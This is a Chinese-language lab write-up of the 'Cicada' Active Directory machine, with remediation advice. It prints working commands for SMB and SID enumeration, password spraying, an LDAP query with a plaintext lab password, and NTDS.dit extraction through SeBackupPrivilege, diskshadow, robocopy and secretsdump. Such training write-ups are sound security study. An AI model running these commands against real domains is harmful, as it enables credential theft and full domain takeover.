## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Cicada
2. 難度:Easy
3. IP:10.129.231.149

### 主要發現：
1. 漏洞 ：SMB共享資料夾敏感資訊外洩（風險等級：High）
2. 漏洞 ：透過權限配置不當的RPC管道獲得使用者清單（風險等級：High）
3. 漏洞 ：LDAP屬性配置不當獲得明文憑證（風險等級：Medium）
4. 漏洞 ：一般使用者過大的特權賦予造成管理員權限外洩（風險等級：High）
5. 漏洞 ：高權限帳號的憑證重用與配置錯誤（風險等級：Medium）

### 攻擊鏈摘要：

攻擊者首先透過SMB枚舉從HR共享資料夾獲得預設密碼，並搭配開放的IPC$枚舉使用者SID，獲取的清單進行密碼噴灑。接著利用獲得的權限從LDAP描述欄位與共享資料夾DEV中內含明文憑證的腳本連續獲取更高級別的憑證。最終透過WinRM登入後，利用SeBackupPrivilege權限導出NTDS.dit與SYSTEM檔，成功獲取網域管理員的NTLM Hash，完全接管網域。

### 潛在影響：

1. 網域完全失陷：獲取Administrator Hash後，攻擊者可進行Pass-the-Hash攻擊，完全掌控整個網域環境。
2. 機敏資料外洩：HR與開發部門的敏感文件及員工個人資料面臨外洩風險。
3. 持久性威脅：攻擊者可導出所有域用戶的Hash，建立後門以維持長期潛伏。

### 修復建議：

1. 清理敏感資訊：立即移除所有存放於共享資料夾、LDAP屬性及腳本中的明文密碼，改用加密的秘密管理系統。
2. 落實最小權限：重新審視帳號權限，移除不必要的SeBackupPrivilege特權，並限制一般用戶枚舉LDAP/SID的能力。
3. 強化認證機制：強制執行強密碼策略，並在WinRM與SMB存取中導入多因素驗證。
4. 監控與審計：啟用對NTDS.dit檔案存取的審計記錄，並監控異常的密碼噴灑與服務登入行為。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，除了AD環境常用服務以外並未有其他特殊服務，並且從詳細訊息掃描中獲得域名和主機名，從UDP掃描得知123/NTP服務是開放的，可以利用其做時間同步

```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.231.149 -oA portscan/ports
sudo nmap -sU --top-ports 20 10.129.231.149 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p99,$ports 10.129.231.149 -oA portscan/detail
sudo nmap --script=vuln 10.129.231.149 -oA portscan/vuln
ports=$(grep open portscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
```

<img width="714" height="405" alt="螢幕擷取畫面 2026-04-25 231940" src="https://github.com/user-attachments/assets/368fa9d0-3e54-4f74-82dc-554db649cd38" />

<img width="616" height="590" alt="螢幕擷取畫面 2026-04-25 231951" src="https://github.com/user-attachments/assets/bbca4642-7b0d-4c7a-b43b-198cf7ce562d" />

<img width="1143" height="828" alt="螢幕擷取畫面 2026-04-25 232610" src="https://github.com/user-attachments/assets/2e74d4b9-2ab9-4f5e-afcc-4641aa7fb0cf" />

<img width="1254" height="432" alt="螢幕擷取畫面 2026-04-25 232625" src="https://github.com/user-attachments/assets/7841ccdd-e91d-4a89-8642-42eeda0c3598" />

<img width="989" height="503" alt="螢幕擷取畫面 2026-04-25 232323" src="https://github.com/user-attachments/assets/f8bb8da3-61bb-4a16-92c4-fe2f357d5ad8" />

<img width="814" height="217" alt="螢幕擷取畫面 2026-04-25 232110" src="https://github.com/user-attachments/assets/feb877cf-ba35-4d79-bbeb-b452f069513c" />

利用UDP123/ntp服務進行時間同步
```bash
sudo ntpdate 10.129.231.149
```

<img width="830" height="97" alt="螢幕擷取畫面 2026-04-25 233747" src="https://github.com/user-attachments/assets/51feece9-831f-4ff5-824d-4b4f06c5377d" />

將掃描到的域名加入/etc/hosts

<img width="501" height="266" alt="螢幕擷取畫面 2026-04-25 232747" src="https://github.com/user-attachments/assets/31fbca00-edf3-453b-a0d5-f28402865091" />


### 2.2 枚舉(Enumeration)

使用smbclient枚舉SMB服務，這個工具可以模仿正常用戶的流量，相對來說比較不會引起管理員注意，但無法掃瞄出資料夾權限，需要手動嘗試

```bash
smbclient -L //10.129.231.149 -N
```

<img width="844" height="311" alt="螢幕擷取畫面 2026-04-25 232830" src="https://github.com/user-attachments/assets/528a1dc6-4b43-4492-9bff-281edb3e1c95" />

<img width="447" height="98" alt="螢幕擷取畫面 2026-04-25 233130" src="https://github.com/user-attachments/assets/2ec6dbeb-ef5f-4363-b4fc-ba1ddc3da2c4" />

<img width="430" height="280" alt="螢幕擷取畫面 2026-04-25 233151" src="https://github.com/user-attachments/assets/7a5a7592-9254-460c-a2f7-d3093cdd844c" />

得知IPC$可訪問，且HR中有個文件，使用get命令下載到攻擊機中

<img width="1064" height="239" alt="螢幕擷取畫面 2026-04-25 233203" src="https://github.com/user-attachments/assets/dec2bd0f-ff04-4b6d-8bf5-4f1801544251" />

文件中得知了一個預設明文密碼，以及一些密碼政策

<img width="1700" height="487" alt="螢幕擷取畫面 2026-04-25 233224" src="https://github.com/user-attachments/assets/45666fa7-0120-4951-8ce0-57c7c6769017" />

既然有預設密碼，只要找到使用者名稱，就可以嘗試密碼噴灑，可期待使用者未更改預設密碼

我使用rpcclient枚舉RPC協議，這個工具也是模仿正常使用者流量

<img width="361" height="124" alt="螢幕擷取畫面 2026-04-25 233603" src="https://github.com/user-attachments/assets/b8993f39-32c5-4dc0-a0b4-21488881ad99" />

rpcclient在枚舉使用者名稱或SID時所需權限較高，可以嘗試使用impacket-lookupsid工具，只要IPC$開放，就可以嘗試針對SID枚舉，關於SID枚舉以及RPC管道的問題我會放在tips

impacket-lookupsid在枚舉SID時預設只到4000，可以手動設高一點，這裡我設成10000

```bash
impacket-lookupsid guest@CICADA-DC.cicada.htb -target-ip 10.129.231.149 -no-pass 10000
```

<img width="835" height="734" alt="螢幕擷取畫面 2026-04-25 235049" src="https://github.com/user-attachments/assets/bb5876f7-da6c-4e5f-a1ee-2340f351ccbb" />

經過篩選後我獲得使用者清單

<img width="280" height="231" alt="螢幕擷取畫面 2026-04-25 235751" src="https://github.com/user-attachments/assets/5b98a997-7aac-4bee-abb0-be8e5881c4c2" />


### 2.3 初始存取(Initial Access)

我使用nxc進行密碼噴灑攻擊，這個工具是crackmapexec的後繼者，專門設計用於對大型網路進行漏洞測試、主機發現、憑證噴灑以及各類協議的枚舉。

```bash
nxc smb 10.129.231.149 -u username -p '...' --continue-on-success
```

<img width="1595" height="190" alt="螢幕擷取畫面 2026-04-26 000113" src="https://github.com/user-attachments/assets/597f0428-d0ac-4e3f-b9cb-5437c9db6bc5" />

獲得一組憑證

<img width="419" height="144" alt="螢幕擷取畫面 2026-04-26 000154" src="https://github.com/user-attachments/assets/45cd950c-0b0f-48a3-b01b-b45235ed836d" />

這組憑證可以登入SMB服務，但沒有特別的收穫，且不能登入winrm遠端控制，所以必須進行橫向移動，獲得其他憑證

<img width="815" height="205" alt="螢幕擷取畫面 2026-04-26 000941" src="https://github.com/user-attachments/assets/854a92ca-6b78-40fa-b381-f4ffba4a2fe5" />

可用nxc嘗試其他協議的權限，只有LDAP允許

<img width="1914" height="246" alt="螢幕擷取畫面 2026-04-26 003220" src="https://github.com/user-attachments/assets/8cb402f3-017c-43a6-a364-1c98f5ba5222" />

### 2.4 橫向移動(Lateral Movement)

LDAP（Lightweight Directory Access Protocol，輕量級目錄存取協定）是一種基於IETF RFC定義的開放標準，專門用於在網路中存取、管理與搜尋目錄資訊，資料以目錄資訊樹(DIT)的形式組織，路徑稱為辨識名稱(DN)。

我使用ldapsearch嘗試枚舉LDAP服務，這是用於與LDAP伺服器通訊並執行查詢的工具，用來診斷目錄服務、匯出資料或驗證權限，指令包含：伺服器位址、認證方式、搜尋起點（Base DN）以及過濾器（Filter）。

1. -x: 使用簡易身份驗證，而非預設的 SASL。
2. -H: 指定LDAP伺服器的UR。
3. -D (Bind DN): 用來登入的用戶帳號路徑。
4. -w: 直接在指令中提供密碼。
5. -b (Base DN): 設定搜尋的起點。
6. -s (Scope): 搜尋範圍，可選base(僅目標項目)、one(下一層) 或 sub(整棵樹，預設)。

```bash
ldapsearch -H ldap://10.129.231.149 -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" sAMAccountName description
```
objectClass=user是過濾只顯示使用者，sAMAccountName是顯示登入帳號名稱的屬性，description是描述欄位，希望從這裡了解一些帳號的備註

<img width="1606" height="387" alt="螢幕擷取畫面 2026-04-26 003740" src="https://github.com/user-attachments/assets/352094c3-1ea8-445e-8265-9a716cc1e701" />

我找到一條備註，其中有明文密碼

<img width="652" height="252" alt="螢幕擷取畫面 2026-04-26 003806" src="https://github.com/user-attachments/assets/ee3d8317-e7ad-40ab-83d2-60c7cef8a167" />

這組憑證可以登入SMB，並且多了DEV可讀

<img width="711" height="227" alt="螢幕擷取畫面 2026-04-26 004312" src="https://github.com/user-attachments/assets/04681614-bbf3-45e6-b264-124c9d053409" />

下載腳本後發現一組明文憑證

<img width="833" height="282" alt="螢幕擷取畫面 2026-04-26 004356" src="https://github.com/user-attachments/assets/cfc8fd4a-2cf0-4b8b-9360-85bf1a3c8c06" />

使用evil-winrm獲得遠端登入權限

<img width="1206" height="275" alt="螢幕擷取畫面 2026-04-26 004702" src="https://github.com/user-attachments/assets/955e115a-4b5b-49e6-80ba-f7f1ce32d3cf" />

獲得user.txt

<img width="642" height="112" alt="螢幕擷取畫面 2026-04-26 004802" src="https://github.com/user-attachments/assets/1edba917-63d0-472f-9a59-18c2fcfb2b0e" />


### 2.5 權限提升(Privilege Escalation)

經過簡單了解後，我發現當前使用者有SeBackupPrivilege權限，這允許我繞過任何檔案系統的ACL來讀取檔案，我可以導出登錄檔來還原管理員憑證

<img width="714" height="739" alt="螢幕擷取畫面 2026-04-26 004917" src="https://github.com/user-attachments/assets/d9b8bac0-e5e2-4d9e-936b-72af7581302e" />

這裡有點概念要澄清，通常在單機Windows類似的枚舉時，會導出SAM + SYSTEM來還原NTLM Hash，但DC通常沒有自己的SAM，在DC上枚舉出的Administrator就是AD管理員，所以應該要導出NTDS.dit + SYSTEM。

只是，DC上偶爾還是可以看到SAM檔，這是為了DSRM管理員準備的，當AD資料庫毀損或需要維修時，DC必須進入「目錄服務修復模式」，此時AD服務不啟動，系統會改用這個本機SAM來驗證身分。

在這台機器裡，剛好DSRM管理員就是AD管理員，這屬於高權限帳號的憑證重用與配置錯誤，會導致本機與網域之間的權限邊界崩潰，我猜這應該是因為靶機抽象了某些環境因素或是機器啟動了某種密碼同步措施才導致的，並不是這台機器的主軸。

以下我以NTDS.dit為主，SAM為輔來演示。

首先創建臨時資料夾，再將system備份到其中(演示用，我同時備份了sam)
```powershell
mkdir C:\Temp
reg save HKLM\SYSTEM C:\Temp\system.bak
reg save HKLM\SAM C:\Temp\sam.bak
```

<img width="855" height="326" alt="螢幕擷取畫面 2026-04-26 005352" src="https://github.com/user-attachments/assets/aa201f3f-694a-4854-9e62-836813a512b5" />

在臨時資料夾中建立腳本，用來導出NTDS.dit

```powershell
"set context persistent nowriters", "add volume c: alias temp", "create", "expose %temp% z:" | Out-File -FilePath script.txt -Encoding ascii

set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

<img width="1543" height="408" alt="螢幕擷取畫面 2026-04-26 012106" src="https://github.com/user-attachments/assets/df8f14d3-9146-4fcc-8802-91e2dc33996a" />

使用Diskshadow提取NTDS.dit

```powershell
diskshadow /s script.txt
```

<img width="982" height="598" alt="螢幕擷取畫面 2026-04-26 012208" src="https://github.com/user-attachments/assets/537af838-df56-4984-a048-73ecf255da79" />

拷貝資料庫，這裡原本我是用copy命令來拷貝，但權限不足，所以我改用robocopy，這是Windows內建的強大複製工具，它有一個/B參數，專門用來調用SeBackupPrivilege繞過ACL。

```powershell
robocopy /B z:\windows\ntds\ C:\Temp\ ntds.dit
```

<img width="1138" height="431" alt="螢幕擷取畫面 2026-04-26 012354" src="https://github.com/user-attachments/assets/1d7b00cc-a7c0-4797-a051-50e12937a99c" />

下載system.bak和NTDS.dit(演示用，sam.bak也一起下載)

```powershell
download C:\\Temp\\system.bak
download C:\\Temp\\sam.bak
download C:\\Temp\\ntds.dit
```

<img width="816" height="184" alt="螢幕擷取畫面 2026-04-26 010027" src="https://github.com/user-attachments/assets/26eae897-3da6-4352-97f0-169802b55cc7" />

<img width="551" height="137" alt="螢幕擷取畫面 2026-04-26 012917" src="https://github.com/user-attachments/assets/1d7f2953-59b1-4e2d-9e04-aa6b1d440002" />

使用impacket-secretdump來還原NTLM Hash，可以看到兩個Administrator的Hash是一樣的

```bash
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

<img width="949" height="724" alt="螢幕擷取畫面 2026-04-26 013046" src="https://github.com/user-attachments/assets/7cd36fe9-e8d6-41c8-8dcb-40e2f880d0f9" />

<img width="813" height="206" alt="螢幕擷取畫面 2026-04-26 010303" src="https://github.com/user-attachments/assets/f8a3a2ff-57e6-421c-bc45-40d5bf6530ee" />

使用evil-winrm的-H參數來登入

<img width="1202" height="273" alt="螢幕擷取畫面 2026-04-26 010312" src="https://github.com/user-attachments/assets/5f016977-e2b5-45ce-96bc-d6aaca70f219" />

### 2.6 最終成果(Impact)

獲得root.txt

<img width="658" height="406" alt="螢幕擷取畫面 2026-04-26 010431" src="https://github.com/user-attachments/assets/ead5c280-ebf3-476e-a943-dbe1e0fae681" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
